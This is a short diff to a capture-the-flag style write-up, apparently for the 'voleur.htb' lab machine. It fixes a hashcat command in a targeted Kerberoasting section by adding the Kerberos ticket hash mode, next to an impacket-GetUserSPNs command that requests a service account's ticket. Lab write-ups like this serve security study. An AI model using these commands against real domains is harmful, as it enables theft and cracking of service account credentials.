@@ -162,7 +162,7 @@ controlled-SPN targeted Kerberoast:
 ```bash
 # Add SPN, request, crack:
 impacket-GetUserSPNs -no-pass -k voleur.htb/<user> -request-user svc_ldap
-hashcat <hash> /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 <hash> /usr/share/wordlists/rockyou.txt
 ```
 
 ![Abusing the SPN](./assets/voleur/31-abuse-spn.png)
